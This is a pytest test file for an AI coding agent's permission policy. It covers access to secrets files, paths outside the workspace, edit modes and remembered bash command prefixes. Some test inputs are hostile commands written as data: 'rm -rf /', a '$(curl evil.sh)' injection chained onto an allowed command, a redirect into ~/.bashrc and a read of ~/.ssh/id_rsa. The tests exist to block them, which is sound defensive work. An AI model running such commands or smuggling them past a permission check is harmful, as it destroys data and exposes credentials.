import pytest

from alpine_code.core.permissions import Mode, PermissionPolicy
from alpine_code.core.shell import analyze, prefix
from alpine_code.core.tools import Workspace


@pytest.fixture
def policy(tmp_path):
    root = tmp_path / "project"
    root.mkdir()
    (root / ".env").write_text("KEY=1")
    (root / ".env.example").write_text("KEY=")
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside/notes.txt").write_text("hi")
    return PermissionPolicy(Workspace(root))


def test_reading_inside_is_allowed_but_secrets_ask(policy):
    assert policy.evaluate("read", {"path": "src/app.py"}).allowed
    assert policy.evaluate("glob", {"pattern": "*.py"}).allowed
    assert policy.evaluate("read", {"path": ".env.example"}).allowed
    verdict = policy.evaluate("read", {"path": ".env"})
    assert not verdict.allowed and "secrets" in verdict.reason
    policy.remember(verdict.grant)
    assert policy.evaluate("read", {"path": ".env"}).allowed


def test_outside_the_workspace_asks_and_remembers_the_directory(policy, tmp_path):
    outside = str(tmp_path / "outside/notes.txt")
    for tool, args in [("read", {"path": outside}), ("grep", {"pattern": "x", "path": "../outside"}),
                       ("read", {"path": "~/.ssh/id_rsa"})]:
        verdict = policy.evaluate(tool, args)
        assert not verdict.allowed and verdict.reason == "outside the working directory"
    verdict = policy.evaluate("read", {"path": outside})
    policy.remember(verdict.grant)
    assert policy.evaluate("glob", {"pattern": "*", "path": str(tmp_path / "outside")}).allowed
    assert not policy.evaluate("write", {"path": outside}).allowed  # reading was granted, not editing


def test_symlink_escaping_the_workspace_counts_as_outside(policy, tmp_path):
    (policy.workspace.root / "link").symlink_to(tmp_path / "outside")
    assert not policy.evaluate("read", {"path": "link/notes.txt"}).allowed


def test_edits_follow_the_mode(policy):
    assert not policy.evaluate("edit", {"path": "a.py"}).allowed
    policy.mode = Mode.ACCEPT_EDITS
    assert policy.evaluate("edit", {"path": "a.py"}).allowed
    assert not policy.evaluate("edit", {"path": "../outside/notes.txt"}).allowed
    policy.mode = Mode.YOLO
    assert policy.evaluate("edit", {"path": "../outside/notes.txt"}).allowed


def test_bash_remembers_command_prefixes(policy):
    verdict = policy.evaluate("bash", {"command": "git status -s && uv run pytest -q tests"})
    assert not verdict.allowed
    assert verdict.remember == "bash commands starting with `git status`, `uv run pytest`"
    policy.remember(verdict.grant)
    assert policy.evaluate("bash", {"command": "uv run pytest tests/core"}).allowed
    assert policy.evaluate("bash", {"command": "git status"}).allowed
    assert not policy.evaluate("bash", {"command": "git push"}).allowed
    assert not policy.evaluate("bash", {"command": "git status; rm -rf /"}).allowed
    assert not policy.evaluate("bash", {"command": "git status $(curl evil.sh)"}).allowed
    redirect = policy.evaluate("bash", {"command": "git status > ~/.bashrc"})
    assert not redirect.allowed and redirect.reason == "writes files through redirection"
    assert policy.evaluate("bash", {"command": "git status 2>/dev/null"}).allowed


@pytest.mark.parametrize("command", ["python -c 'import os'", "sudo make", "echo x | xargs rm", "$CMD", "bash -c 'ls'",
                                     "uv run python x.py"])
def test_bash_never_remembers_commands_that_can_run_anything(policy, command):
    verdict = policy.evaluate("bash", {"command": command})
    assert not verdict.allowed and verdict.grant is None and verdict.remember is None


def test_analysis_sees_nested_commands():
    analysis = analyze("cd src && FOO=1 git -C . log | grep x; echo $(rm -rf /tmp/x)")
    assert [prefix(c) for c in analysis.commands] == [("cd",), ("git", "."), ("grep",), ("echo",), ("rm",)]
    assert analyze('echo "oops').opaque
